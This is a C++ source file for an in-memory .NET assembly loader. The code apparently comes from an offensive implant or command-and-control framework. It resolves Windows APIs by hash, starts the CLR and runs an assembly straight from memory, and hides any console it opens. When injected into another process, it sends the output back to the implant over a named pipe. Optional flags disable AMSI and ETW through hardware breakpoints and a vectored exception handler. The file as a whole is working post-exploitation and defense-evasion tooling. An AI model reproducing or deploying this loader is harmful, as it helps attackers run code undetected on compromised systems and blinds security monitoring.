#include <Common.h>

namespace mscorlib {
    #include "mscorlib.h"
}

__CRT_UUID_DECL( mscorlib::_AppDomain, 0x05F696DC, 0x2B29, 0x3663, 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13 );

EXTERN_C HRESULT KNAPI ScAssemblyEnter(
    _In_ PARG_CTX Arg
) {
    INSTANCE               Instance        = { 0 };
    HRESULT                Result          = { 0 };
    UNICODE_STRING         Unicode         = { 0 };
    GUID                   GidMetaHost     = { 0 };
    GUID                   GidRuntimeHost  = { 0 };
    GUID                   IIDMetaHost     = { 0 };
    GUID                   IIDRuntimeInfo  = { 0 };
    GUID                   IIDRuntimeHost  = { 0 };
    BUFFER                 NetVersion      = { 0 };
    BSTR                   AppAssemblyName = { 0 };
    ULONG                  Boolean         = { 0 };
    BUFFER                 Arguments       = { 0 };
    ICLRMetaHost*          MetaHost        = { 0 };
    ICLRRuntimeInfo*       RuntimeInfo     = { 0 };
    ICorRuntimeHost*       RuntimeHost     = { 0 };
    HDOMAINENUM            AppDomainEnum   = { 0 };
    IUnknown*              AppDomainThunk  = { 0 };
    IEnumUnknown*          Runtime         = { 0 };
    mscorlib::_AppDomain*  AppDomain       = { 0 };
    mscorlib::_Assembly*   Assembly        = { 0 };
    mscorlib::_MethodInfo* MethodInfo      = { 0 };
    PVOID                  DataAssembly    = { 0 };
    SAFEARRAY*             SafeAssembly    = { 0 };
    SAFEARRAY*             SafeExpected    = { 0 };
    SAFEARRAY*             SafeArguments   = { 0 };
    SAFEARRAY*             SafeAssemblies  = { 0 };
    VARIANT                VariantArgv     = { 0 };
    SAFEARRAYBOUND         SafeArrayBound  = { 0 };
    LONG                   BoundLower      = { 0 };
    LONG                   BoundUpper      = { 0 };
    LONG                   Idx             = { 0 };
    SECURITY_ATTRIBUTES    SecurityAttr    = { 0 };
    HANDLE                 Heap            = { 0 };
    PTEB                   Teb             = { 0 };
    HANDLE                 VehHandle       = { 0 };
    PVOID                  Exception       = { 0 };
    ULONG                  Position        = { 0 };
    HWND                   ConExist        = { 0 };
    HWND                   ConAlloc        = { 0 };
    ARG_CTX                Ctx             = { 0 };
    ULONG_PTR              Ptr             = { 0 };

    if ( ! Arg ) {
        return STATUS_INVALID_PARAMETER;
    }

    memory::zero( &Self, sizeof( Self ) );
    memory::copy( &Ctx, Arg, sizeof( Ctx ) );

    Teb  = NtCurrentTeb();
    Heap = Teb->ProcessEnvironmentBlock->ProcessHeap;

    //
    // ntdll.dll
    //
    if ( ( Self.Ntdll = LdrModuleHandle( H_LIB_NTDLL ) ) ) {
        if ( ! ( Self.Win32.LdrLoadDll = LdrFunction( Self.Ntdll, HASH_STR( "LdrLoadDll" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.RtlAllocateHeap = LdrFunction( Self.Ntdll, HASH_STR( "RtlAllocateHeap" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.RtlFreeHeap = LdrFunction( Self.Ntdll, HASH_STR( "RtlFreeHeap" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.RtlAddVectoredExceptionHandler = LdrFunction( Self.Ntdll, HASH_STR( "RtlAddVectoredExceptionHandler" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.RtlRemoveVectoredExceptionHandler = LdrFunction( Self.Ntdll, HASH_STR( "RtlRemoveVectoredExceptionHandler" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.NtClose = LdrFunction( Self.Ntdll, HASH_STR( "NtClose" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.NtTraceEvent = LdrFunction( Self.Ntdll, HASH_STR( "NtTraceEvent" ) ) ) ) {
            goto END;
        }
    } else goto END;

    //
    // mscoree.dll
    //
    if ( ! Self.Mscoree ) {
        if ( ! ( Self.Mscoree = LdrModuleHandle( H_LIB_MSCOREE ) ) ) {
            KnUnicodeString( &Unicode, L"mscoree.dll" );

            if ( ! NT_SUCCESS( Self.Win32.LdrLoadDll( 0, 0, &Unicode, &Self.Mscoree ) ) ) {
                goto END;
            }
        }

        //
        // load mscoree api
        //
        if ( ! ( Self.Win32.CLRCreateInstance = LdrFunction( Self.Mscoree, HASH_STR( "CLRCreateInstance" ) ) ) ) {
            goto END;
        }
    }

    //
    // kernelbase.dll
    //
    if ( ! Self.KernelBase ) {
        if ( ! ( Self.KernelBase = LdrModuleHandle( H_LIB_KERNELBASE ) ) ) {
            KnUnicodeString( &Unicode, L"kernelbase.dll" );

            if ( ! NT_SUCCESS( Self.Win32.LdrLoadDll( 0, 0, &Unicode, &Self.KernelBase ) ) ) {
                goto END;
            }
        }

        //
        // load kernelbase api
        //
        if ( ! ( Self.Win32.CommandLineToArgvW = LdrFunction( Self.KernelBase, HASH_STR( "CommandLineToArgvW" ) ) ) ) {
            goto END;
        }

        if ( Ctx.Flags.IsInjected ) {
            if ( ! ( Self.Win32.CreateNamedPipeW = LdrFunction( Self.KernelBase, HASH_STR( "CreateNamedPipeW" ) ) ) ) {
                goto END;
            }

            if ( ! ( Self.Win32.ConnectNamedPipe = LdrFunction( Self.KernelBase, HASH_STR( "ConnectNamedPipe" ) ) ) ) {
                goto END;
            }

            if ( ! ( Self.Win32.DisconnectNamedPipe = LdrFunction( Self.KernelBase, HASH_STR( "DisconnectNamedPipe" ) ) ) ) {
                goto END;
            }

            if ( ! ( Self.Win32.WriteFile = LdrFunction( Self.KernelBase, HASH_STR( "WriteFile" ) ) ) ) {
                goto END;
            }

            if ( ! ( Self.Win32.FlushFileBuffers = LdrFunction( Self.KernelBase, HASH_STR( "FlushFileBuffers" ) ) ) ) {
                goto END;
            }
        } else {
            if ( ! ( Self.Win32.CreatePipe = LdrFunction( Self.KernelBase, HASH_STR( "CreatePipe" ) ) ) ) {
                goto END;
            }
        }

        if ( ! ( Self.Win32.AllocConsole = LdrFunction( Self.KernelBase, HASH_STR( "AllocConsole" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.GetConsoleWindow = LdrFunction( Self.KernelBase, HASH_STR( "GetConsoleWindow" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.FreeConsole = LdrFunction( Self.KernelBase, HASH_STR( "FreeConsole" ) ) ) ) {
            goto END;
        }
    }

    //
    // user32.dll
    //
    if ( ! Self.User32 ) {
        if ( ! ( Self.User32 = LdrModuleHandle( H_LIB_USER32 ) ) ) {
            KnUnicodeString( &Unicode, L"user32.dll" );

            if ( ! NT_SUCCESS( Self.Win32.LdrLoadDll( 0, 0, &Unicode, &Self.User32 ) ) ) {
                goto END;
            }
        }

        //
        // load user32.dll
        //
        if ( ! ( Self.Win32.ShowWindow = LdrFunction( Self.User32, HASH_STR( "ShowWindow" ) ) ) ) {
            goto END;
        }
    }

    //
    // amsi.dll
    //
    if ( Ctx.Flags.BypassAmsi ) {
        if ( ! ( Self.Amsi = LdrModuleHandle( H_LIB_AMSI ) ) ) {
            KnUnicodeString( &Unicode, L"amsi.dll" );

            if ( ! NT_SUCCESS( Self.Win32.LdrLoadDll( 0, 0, &Unicode, &Self.Amsi ) ) ) {
                goto END;
            }
        }

        //
        // load amsi api
        //
        if ( ! ( Self.Win32.AmsiScanBuffer = LdrFunction( Self.Amsi, HASH_STR( "AmsiScanBuffer" ) ) ) ) {
            goto END;
        }
    }

    //
    // oleaut32.dll
    //
    if ( ! Self.Ole32 ) {
        if ( ! ( Self.Ole32 = LdrModuleHandle( H_LIB_OLE32 ) ) ) {
            KnUnicodeString( &Unicode, L"oleaut32.dll" );

            if ( ! NT_SUCCESS( Self.Win32.LdrLoadDll( 0, 0, &Unicode, &Self.Ole32 ) ) ) {
                goto END;
            }
        }

        //
        // load oleaut32 api
        //
        if ( ! ( Self.Win32.SafeArrayCreate = LdrFunction( Self.Ole32, HASH_STR( "SafeArrayCreate" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.SafeArrayDestroy = LdrFunction( Self.Ole32, HASH_STR( "SafeArrayDestroy" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.SafeArrayCreateVector = LdrFunction( Self.Ole32, HASH_STR( "SafeArrayCreateVector" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.SafeArrayPutElement = LdrFunction( Self.Ole32, HASH_STR( "SafeArrayPutElement" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.SafeArrayGetLBound = LdrFunction( Self.Ole32, HASH_STR( "SafeArrayGetLBound" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.SafeArrayGetUBound = LdrFunction( Self.Ole32, HASH_STR( "SafeArrayGetUBound" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.SafeArrayGetElement = LdrFunction( Self.Ole32, HASH_STR( "SafeArrayGetElement" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.SysAllocString = LdrFunction( Self.Ole32, HASH_STR( "SysAllocString" ) ) ) ) {
            goto END;
        }

        if ( ! ( Self.Win32.SysFreeString = LdrFunction( Self.Ole32, HASH_STR( "SysFreeString" ) ) ) ) {
            goto END;
        }
    }

    //
    // if the loader has been injected the adjust the arguments correctly
    //
    if ( Ctx.Flags.IsInjected ) {
        Ptr = U_PTR( Arg );

        memory::copy( &Ctx.Flags.Value, C_PTR( Ptr ), sizeof( ULONG ) );
        Ptr += sizeof( ULONG );

        memory::copy( &Ctx.Invoke.Assembly.Length, C_PTR( Ptr ), sizeof( ULONG ) );
        Ctx.Invoke.Assembly.Buffer.p = C_PTR( Ptr + sizeof( ULONG ) );
        Ptr += sizeof( ULONG ) + Ctx.Invoke.Assembly.Length;

        memory::copy( &Ctx.Invoke.Arguments.Length, C_PTR( Ptr ), sizeof( ULONG ) );
        Ctx.Invoke.Arguments.Buffer.p = C_PTR( Ptr + sizeof( ULONG ) );
        Ptr += sizeof( ULONG ) + Ctx.Invoke.Arguments.Length;

        memory::copy( &Ctx.Invoke.AppDomain.Length, C_PTR( Ptr ), sizeof( ULONG ) );
        Ctx.Invoke.AppDomain.Buffer.p = C_PTR( Ptr + sizeof( ULONG ) );
        Ptr += sizeof( ULONG ) + Ctx.Invoke.AppDomain.Length;

        memory::copy( &Ctx.Invoke.Version.Length, C_PTR( Ptr ), sizeof( ULONG ) );
        Ctx.Invoke.Version.Buffer.p = C_PTR( Ptr + sizeof( ULONG ) );
        Ptr += sizeof( ULONG ) + Ctx.Invoke.Version.Length;

        memory::copy( &Ctx.Invoke.PipeName.Length, C_PTR( Ptr ), sizeof( ULONG ) );
        Ctx.Invoke.PipeName.Buffer.p = C_PTR( Ptr + sizeof( ULONG ) );
    }

    if ( Ctx.Flags.Pipe ) {
        //
        // if the payload has been injected into a process then
        // we have to create a named pipe so the implant can read
        // the output from this process.
        //
        if ( Ctx.Flags.IsInjected ) {
            //
            // create a named pipe
            //
            if ( ( Ctx.Return.IoPipe.Write = Self.Win32.CreateNamedPipeW(
                Ctx.Invoke.PipeName.Buffer.w,
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                PIPE_UNLIMITED_INSTANCES,
                PIPE_BUFFER_LENGTH,
                PIPE_BUFFER_LENGTH,
                0,
                NULL
            ) ) == INVALID_HANDLE_VALUE ) {
                Result = Teb->LastErrorValue;
                goto END;
            }

            //
            // wait for the implant to connect to us for
            // the output of the assembly to be executed
            //
            if ( ! Self.Win32.ConnectNamedPipe( Ctx.Return.IoPipe.Write, NULL ) &&
                 Teb->LastErrorValue != ERROR_PIPE_CONNECTED
            ) {
                Result = Teb->LastErrorValue;
                goto END;
            }
        } else {
            //
            // initialize stdout pipes
            //
            SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
            if ( ! ( Self.Win32.CreatePipe( &Arg->Return.IoPipe.Read, &Ctx.Return.IoPipe.Write, NULL, PIPE_BUFFER_LENGTH ) ) ) {
                Result = Teb->LastErrorValue;
                goto END;
            }
        }

        //
        // allocate a new console for the current process
        // if no console is available or has been allocated
        //
        if ( ! ( ConExist = Self.Win32.GetConsoleWindow() ) ) {
            //
            // TODO: query the current process if its allowed to even
            //       have spawn a child process (what AllocConsole is going to do)
            //       as applications like Office 356 apps that are protected by ATP
            //       dont allow child process creation.
            //

            //
            // allocate console
            //
            Self.Win32.AllocConsole();
            ConAlloc = Self.Win32.GetConsoleWindow();

            //
            // hides the console if visible
            //
            if ( ConAlloc ) {
                Self.Win32.ShowWindow( ConAlloc, SW_HIDE );
            }
        }

        //
        // backup the current stdout console handle
        //
        Ctx.Return.IoPipe.StdoutBkg = Teb->ProcessEnvironmentBlock->ProcessParameters->StandardOutput;

        //
        // replace current console stdout
        // handle to the pipes
        //
        Teb->ProcessEnvironmentBlock->ProcessParameters->StandardOutput = Ctx.Return.IoPipe.Write;
    }

    //
    // enable bypasses if specified
    //
    if ( Ctx.Flags.BypassAmsi || Ctx.Flags.BypassEtw ) {
        KnSymbolPointer();

        //
        // set the exception handler for etw and or amsi
        //
        if ( Ctx.Flags.BypassAmsi && Ctx.Flags.BypassEtw ) {
            Exception = G_SYM( HwbpExceptionEtwAmsi );
        } else if ( Ctx.Flags.BypassEtw ) {
            Exception = G_SYM( HwbpExceptionEtw );
        } else if ( Ctx.Flags.BypassAmsi ) {
            Exception = G_SYM( HwbpExceptionAmsi );
        }

        //
        // start the VEH handler with the specified bypass
        //
        if ( ! ( VehHandle = Self.Win32.RtlAddVectoredExceptionHandler( TRUE, PVECTORED_EXCEPTION_HANDLER( Exception ) ) ) ) {
            goto END;
        }

        //
        // set the exception handler for etw and or amsi
        //
        if ( Ctx.Flags.BypassEtw ) {
            HwbpEngineBreakpoint( Position++, Self.Win32.NtTraceEvent );
        }

        if ( Ctx.Flags.BypassAmsi ) {
            HwbpEngineBreakpoint( Position++, Self.Win32.AmsiScanBuffer );
        }
    }

    //
    // Host/Create Clr instance Guids/IIDs
    //
    GidMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
    GidRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
    IIDMetaHost    = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
    IIDRuntimeInfo = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
    IIDRuntimeHost = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };

    //
    // create a CLR instance
    //
    if ( ( Result = Self.Win32.CLRCreateInstance( GidMetaHost, IIDMetaHost, PPVOID( &MetaHost ) )  ) ) {
        goto END;
    }

    memory::copy( &NetVersion, ( Ctx.Flags.ListDomains || Ctx.Flags.Unload ) ? &Ctx.Misc.Version : &Ctx.Invoke.Version, sizeof( BUFFER ) );

    //
    // get installed runtime to either list all the versions or
    // if Ctx.Version has not specified a specific version
    //
    if ( ( Ctx.Flags.ListVersion ) || ! NetVersion.Length ) {
        //
        // list all installed and available CLR runtimes
        //
        if ( FAILED( MetaHost->EnumerateInstalledRuntimes( &Runtime ) ) ) {
            goto END;
        }

        //
        // iterate over installed runtimes
        //
        while ( SUCCEEDED( Runtime->Next( 1, &RuntimeInfo, &Boolean ) ) && Boolean ) {
            //
            // get the size of string to allocate
            //
            RuntimeInfo->GetVersionString( NULL, &NetVersion.Length );

            //
            // only list the installed version
            //
            if ( Ctx.Flags.ListVersion ) {
                //
                // allocate memory inside the buffer and
                // get the pointer to the allocated location
                //
                NetVersion.Buffer.u  = Ctx.Misc.AddBytes( Ctx.Return.Buffer, NULL, NetVersion.Length * sizeof( WCHAR ) );
                NetVersion.Buffer.u += Ctx.Return.Buffer->Buffer.u;
            } else {
                //
                // try to get a version from installed runtimes to use
                // to initialize and start the CLR in the current process
                //
                NetVersion.Buffer.p = Self.Win32.RtlAllocateHeap( Heap, HEAP_ZERO_MEMORY, NetVersion.Length * sizeof( WCHAR ) );
            }

            //
            // write the version string to the
            // previously allocated buffer
            //
            RuntimeInfo->GetVersionString( NetVersion.Buffer.w, &NetVersion.Length );

            if ( ! Ctx.Flags.ListVersion ) {
                break;
            }
        }

        //
        // no need to continue and starting the CLR
        //
        if ( Ctx.Flags.ListVersion ) {
            Result = 0;
            goto END;
        }
    }

    //
    // get the specified runtime info based on the version
    //
    if ( ( Result = MetaHost->GetRuntime( NetVersion.Buffer.w, IIDRuntimeInfo, PPVOID( &RuntimeInfo ) ) ) ) {
        goto END;
    }

    //
    // check if the runtime we specified is loadable
    //
    if ( ( Result = RuntimeInfo->IsLoadable( ( PBOOL ) &Boolean ) ) ||
         ! Boolean
    ) {
        goto END;
    }

    //
    // now load the specified CLR version into the current process
    //
    if ( ( Result = RuntimeInfo->GetInterface(GidRuntimeHost, IIDRuntimeHost, PPVOID( &RuntimeHost ) ) ) ) {
        goto END;
    }

    //
    // start the loaded CLR
    //
    if ( ( Result = RuntimeHost->Start() ) ) {
        goto END;
    }

    if ( Ctx.Flags.ListDomains ) {
        //
        // list loaded app domain in the current CLR instance
        //
        if ( ! Ctx.Misc.AddBytes && ! Ctx.Return.Buffer ) {
            Result = STATUS_INVALID_PARAMETER;
            goto END;
        }

        //
        // get a list of app domains
        //
        if ( FAILED( Result = RuntimeHost->EnumDomains( &AppDomainEnum ) ) )  {
            goto END;
        }

        if ( FAILED( Result = RuntimeHost->NextDomain( AppDomainEnum, &AppDomainThunk ) ) ) {
            goto END;
        }

        while ( Result == S_OK ) {
            AppDomain = NULL;

            if ( FAILED( Result = AppDomainThunk->QueryInterface( IID_PPV_ARGS( &AppDomain ) ) ) ) {
                break;
            }

            //
            // get name of app domain
            //
            if ( SUCCEEDED( Result = AppDomain->get_FriendlyName( &AppAssemblyName ) ) ) {
                Ctx.Misc.AddBytes( Ctx.Return.Buffer, AppAssemblyName, KnUtilStrLenW( AppAssemblyName ) * sizeof( WCHAR ) );
                Self.Win32.SysFreeString( AppAssemblyName );

                //
                // get list of assemblies loaded into the app domain
                //
                if ( FAILED( Result = AppDomain->GetAssemblies( &SafeAssemblies ) ) ) {
                    break;
                }

                BoundLower = 0;
                Self.Win32.SafeArrayGetLBound( SafeAssemblies, 1, &BoundLower );

                BoundUpper = 0;
                Self.Win32.SafeArrayGetUBound( SafeAssemblies, 1, &BoundUpper );

                //
                // iterate over loaded assemblies
                //
                for ( long i = BoundLower; i <= BoundUpper; i++ ) {
                    //
                    // get the assembly instance from the array
                    //
                    Assembly = NULL;
                    Self.Win32.SafeArrayGetElement( SafeAssemblies, &i, &Assembly );

                    //
                    // get the name of the loaded assembly and
                    // add it to the return buffer
                    //
                    Assembly->get_ToString( &AppAssemblyName );
                    Ctx.Misc.AddBytes( Ctx.Return.Buffer, AppAssemblyName, KnUtilStrLenW( AppAssemblyName ) * sizeof( WCHAR ) );

                    Self.Win32.SysFreeString( AppAssemblyName );
                }

                //
                // mark end of current app domain and loaded assemblies
                //
                Ctx.Misc.AddBytes( Ctx.Return.Buffer, NULL, 0 );
            }

            AppDomain->Release();
            AppDomainThunk->Release();
            AppDomainThunk = NULL;
            AppDomain      = NULL;
            Result         = RuntimeHost->NextDomain( AppDomainEnum, &AppDomainThunk );
        };

        Result = 0;

        RuntimeHost->CloseEnum( AppDomainEnum );
    } else {
        //
        // invoke assembly
        //

        //
        // check if we want to create a new app domain
        //
        if ( Ctx.Flags.AppDomain || Ctx.Flags.Unload ) {
            //
            // get a list of app domains
            //
            if ( FAILED( Result = RuntimeHost->EnumDomains( &AppDomainEnum ) ) )  {
                goto END;
            }

            if ( FAILED( Result = RuntimeHost->NextDomain( AppDomainEnum, &AppDomainThunk ) ) ) {
                goto END;
            }

            while ( Result == S_OK ) {
                AppDomain = NULL;
                Boolean   = FALSE;

                if ( FAILED( Result = AppDomainThunk->QueryInterface( IID_PPV_ARGS( &AppDomain ) ) ) ) {
                    AppDomainThunk = NULL;
                    break;
                }

                //
                // get name of app domain
                //
                if ( SUCCEEDED( Result = AppDomain->get_FriendlyName( &AppAssemblyName ) ) ) {
                    //
                    // check if the app domain already exists
                    //
                    if ( Ctx.Flags.Unload ) {
                        if ( KnUtilStrCmpW( AppAssemblyName, Ctx.Misc.Domain.Buffer.w, ( Ctx.Misc.Domain.Length / sizeof( WCHAR ) ) ) == 0 ) {
                            Boolean = TRUE;
                        }
                    } else {
                        if ( KnUtilStrCmpW( AppAssemblyName, Ctx.Invoke.AppDomain.Buffer.w, ( Ctx.Invoke.AppDomain.Length / sizeof( WCHAR ) ) ) == 0 ) {
                            Boolean = TRUE;
                        }
                    }

                    Self.Win32.SysFreeString( AppAssemblyName );

                    if ( Boolean ) {
                        break;
                    }
                }

                AppDomainThunk = NULL;
                Result         = RuntimeHost->NextDomain( AppDomainEnum, &AppDomainThunk );
            };

            RuntimeHost->CloseEnum( AppDomainEnum );

            if ( ! AppDomainThunk && ! Ctx.Flags.Unload ) {
                //
                // no app domain with the name specified has been
                // found, so we are just going to create a new one
                //
                if ( ( Result = RuntimeHost->CreateDomain( Ctx.Invoke.AppDomain.Buffer.w, NULL, &AppDomainThunk ) ) ) {
                    goto END;
                }
            } else if ( Ctx.Flags.Unload ) {
                //
                // check if the app domain has been retrieved
                //
                if ( ! AppDomainThunk ) {
                    Result = STATUS_NOT_FOUND;
                    goto END;
                }
            }
        } else {
            //
            // use default app domain
            //
            if ( ( Result = RuntimeHost->GetDefaultDomain( &AppDomainThunk ) ) ) {
                goto END;
            }
        }

        //
        // query app domain interface
        //
        if ( ( Result = AppDomainThunk->QueryInterface( IID_PPV_ARGS( &AppDomain ) ) ) ) {
            goto END;
        }

        if ( Ctx.Flags.Invoke ) {
            //
            // get list of assemblies loaded into the app domain
            //
            if ( FAILED( Result = AppDomain->GetAssemblies( &SafeAssemblies ) ) ) {
                goto END;
            }

            Boolean    = FALSE;
            BoundLower = 0;
            Self.Win32.SafeArrayGetLBound( SafeAssemblies, 1, &BoundLower );

            BoundUpper = 0;
            Self.Win32.SafeArrayGetUBound( SafeAssemblies, 1, &BoundUpper );

            //
            // iterate over loaded assemblies
            //
            for ( long i = BoundLower; i <= BoundUpper; i++ ) {
                //
                // get the assembly instance from the array
                //
                Assembly = NULL;
                Self.Win32.SafeArrayGetElement( SafeAssemblies, &i, &Assembly );

                //
                // get the name of the loaded assembly
                //
                Assembly->get_ToString( &AppAssemblyName );

                if ( KnUtilStrCmpW( AppAssemblyName, Ctx.Invoke.Assembly.Buffer.w, ( Ctx.Invoke.Assembly.Length / sizeof( WCHAR ) ) - sizeof( WCHAR ) ) == 0 ) {
                    Boolean = TRUE;
                }

                Self.Win32.SysFreeString( AppAssemblyName );

                if ( Boolean ) {
                    break;
                }

                Assembly = NULL;
            }
        } else if ( Ctx.Flags.Unload ) {
            //
            // unload the specified app domain
            //
            goto END;
        } else {
            //
            // load assembly file into memory
            //

            //
            // load assembly file into a safe array
            //
            SafeArrayBound = { Ctx.Invoke.Assembly.Length, 0 };
            SafeAssembly   = Self.Win32.SafeArrayCreate( VT_UI1, 1, &SafeArrayBound );

            //
            // write assembly bytes into the safe array
            //
            memory::copy( SafeAssembly->pvData, Ctx.Invoke.Assembly.Buffer.p, Ctx.Invoke.Assembly.Length );

            //
            // load assembly into the app domain
            //
            if ( ( Result = AppDomain->Load_3( SafeAssembly, &Assembly ) ) ) {
                goto END;
            }
        }

        //
        // check if assembly has been loaded or found
        //
        if ( ! Assembly ) {
            Result = STATUS_NOT_FOUND;
            goto END;
        }

        //
        // get entrypoint from the loaded assembly
        //
        if ( ( Result = Assembly->get_EntryPoint( &MethodInfo ) ) ) {
            goto END;
        }

        //
        // check if arguments are expected
        //
        if ( ( Result = MethodInfo->GetParameters( &SafeExpected ) ) ) {
            goto END;
        }

        //
        // create/build arguments
        //
        if ( SafeExpected ) {
            if ( SafeExpected->cDims && SafeExpected->rgsabound[ 0 ].cElements ) {
                SafeArguments = Self.Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );

                if ( Ctx.Invoke.Arguments.Length ) {
                    Arguments.Buffer.p = Self.Win32.CommandLineToArgvW( Ctx.Invoke.Arguments.Buffer.w, PINT( &Arguments.Length ) );
                }

                VariantArgv.parray = Self.Win32.SafeArrayCreateVector( VT_BSTR, 0, Arguments.Length );
                VariantArgv.vt     = ( VT_ARRAY | VT_BSTR );

                for ( Idx = 0; Idx < Arguments.Length; Idx++ ) {
                    Self.Win32.SafeArrayPutElement( VariantArgv.parray, &Idx, Self.Win32.SysAllocString( Arguments.Buffer.wa[ Idx ] ) );
                }

                Idx = 0;
                Self.Win32.SafeArrayPutElement( SafeArguments, &Idx, &VariantArgv );
                Self.Win32.SafeArrayDestroy( VariantArgv.parray );
            }
        }

        //
        // invoke the main entrypoint
        //
        if ( ( Result = MethodInfo->Invoke_3( VARIANT(), SafeArguments, NULL ) ) ) {
            goto END;
        }
    }

END:
    if ( Arguments.Buffer.p ) {
        if ( Self.Win32.RtlFreeHeap ) {
            Self.Win32.RtlFreeHeap( Heap, HEAP_ZERO_MEMORY, Arguments.Buffer.p );
        }
        memory::zero( Arguments.Buffer.p, Arguments.Length );
        Arguments.Buffer.p = NULL;
    }

    if ( NetVersion.Buffer.p ) {
        if ( ( Ctx.Flags.ListDomains && ! Ctx.Misc.Version.Length   ) ||
           ( ! Ctx.Flags.ListVersion && ! Ctx.Invoke.Version.Length ) )
        {
            memory::zero( NetVersion.Buffer.p, NetVersion.Length );
            Self.Win32.RtlFreeHeap( Heap, HEAP_ZERO_MEMORY, NetVersion.Buffer.p );
        }
    }

    if ( SafeAssemblies ) {
        Self.Win32.SafeArrayDestroy( SafeAssemblies );
        SafeAssemblies = NULL;
    }

    if ( SafeArguments ) {
        Self.Win32.SafeArrayDestroy( SafeArguments );
        SafeArguments = NULL;
    }

    if ( MethodInfo ) {
        MethodInfo->Release();
    }

    if ( Assembly ) {
        Assembly->Release();
    }

    if ( AppDomain ) {
        AppDomain->Release();
    }

    if ( AppDomainThunk ) {
        AppDomainThunk->Release();
    }

    //
    // do not unload the app domain if we want to keep
    // using the assemblies unless we are requesting to
    // unload a specific app domain
    //
    if ( ( ! Ctx.Flags.KeepLoaded && ! Ctx.Flags.Invoke ) || Ctx.Flags.Unload ) {
        if ( AppDomain ) {
            RuntimeHost->UnloadDomain( AppDomain );
        }
    }

    if ( RuntimeInfo ) {
        RuntimeInfo->Release();
    }

    if ( MetaHost ) {
        MetaHost->Release();
    }

    //
    // remove hardware breakpoints
    //
    if ( Ctx.Flags.BypassAmsi || Ctx.Flags.BypassEtw ) {
        do {
            HwbpEngineBreakpoint( --Position, NULL );
        } while ( Position );

        Self.Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
    }

    //
    // disconnect the client from the named pipe
    // server and recover old Stdout handle
    //
    if ( Ctx.Flags.IsInjected && Ctx.Return.IoPipe.Write ) {
        //
        // if an error occurred then write it to the pipe
        //
        if ( Result ) {
            Self.Win32.WriteFile( Ctx.Return.IoPipe.Write, &Result, sizeof( Result ), NULL, 0 );
        }

        KnSleepShared( 1000 );

        //
        // flush data, disconnect and close handle
        //
        Self.Win32.FlushFileBuffers( Ctx.Return.IoPipe.Write );
        Self.Win32.DisconnectNamedPipe( Ctx.Return.IoPipe.Write );
        Self.Win32.NtClose( Ctx.Return.IoPipe.Write );

        //
        // recover Stdout handle
        //
        Teb->ProcessEnvironmentBlock->ProcessParameters->StandardOutput = Ctx.Return.IoPipe.StdoutBkg;
    }

    //
    // free allocated console
    //
    if ( ! ConExist ) {
        Self.Win32.FreeConsole();
    }

    memory::zero( &Ctx, sizeof( Ctx ) );

    return Result;
}